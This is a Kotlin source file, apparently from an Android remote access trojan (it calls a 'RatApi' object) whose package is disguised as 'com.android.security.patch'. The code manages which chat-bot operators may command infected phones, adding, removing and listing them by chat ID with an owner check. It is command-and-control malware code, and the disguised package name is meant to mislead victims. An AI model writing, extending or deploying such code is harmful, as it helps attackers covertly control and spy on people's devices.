package com.android.security.patch

import android.content.Context

object OpMgr {
    fun add(ctx: Context, chatId: Long, args: Array<String>) {
        val owner = Prefs.getLong(ctx, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
        // hanya owner (chat id dari config) yang boleh add
        if (chatId != owner) {
            RatApi.sendMessage(ctx, "only owner can add operators", chatId); return
        }
        val id = args.getOrNull(0)?.toLongOrNull()
        if (id == null) { RatApi.sendMessage(ctx, "usage: /op_add &lt;chat_id&gt;", chatId); return }
        val cur = Prefs.getStr(ctx, Prefs.OPERATORS, "").orEmpty().split(",").filter { it.isNotBlank() }.toMutableList()
        if (!cur.contains(id.toString())) cur.add(id.toString())
        Prefs.setStr(ctx, Prefs.OPERATORS, cur.joinToString(","))
        RatApi.sendMessage(ctx, "operator added: <code>$id</code>", chatId)
    }

    fun del(ctx: Context, chatId: Long, args: Array<String>) {
        val owner = Prefs.getLong(ctx, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
        if (chatId != owner) { RatApi.sendMessage(ctx, "only owner", chatId); return }
        val id = args.getOrNull(0)?.toLongOrNull() ?: run {
            RatApi.sendMessage(ctx, "usage: /op_del &lt;chat_id&gt;", chatId); return
        }
        val cur = Prefs.getStr(ctx, Prefs.OPERATORS, "").orEmpty().split(",").filter { it.isNotBlank() }.toMutableList()
        cur.remove(id.toString())
        Prefs.setStr(ctx, Prefs.OPERATORS, cur.joinToString(","))
        RatApi.sendMessage(ctx, "operator removed: <code>$id</code>", chatId)
    }

    fun list(ctx: Context, chatId: Long) {
        val cur = Prefs.getStr(ctx, Prefs.OPERATORS, "").orEmpty()
        RatApi.sendMessage(ctx, "operators: <code>$cur</code>", chatId)
    }
}